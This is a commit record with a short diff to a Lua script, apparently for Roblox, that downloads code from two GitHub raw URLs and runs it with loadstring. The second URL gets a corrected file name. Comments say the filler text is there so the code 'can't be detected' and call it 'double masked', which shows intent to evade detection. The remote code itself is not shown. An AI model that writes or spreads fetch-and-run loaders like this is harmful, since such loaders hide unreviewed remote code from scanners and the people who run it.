c92cc0ca9735de8c9e00130dfbc24122f201a436
BetaJayYt <javienscodm@gmail.com>
2025-03-08 19:43:52 -0600

    Update New.lua

--- New.lua
+++ New.lua
@@ -1,4 +1,4 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Overgustx2/Main/refs/heads/main/BloxFruits_25.html"))()
 --random filler words so that it can't be detected--
-loadstring(game:HttpGet("https://raw.githubusercontent.com/BetaJayYt/Ps99opscript/refs/heads/main/So%20we're%20here"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BetaJayYt/Ps99opscript/refs/heads/main/So%20we're%20here.lua"))()
 --double masked--
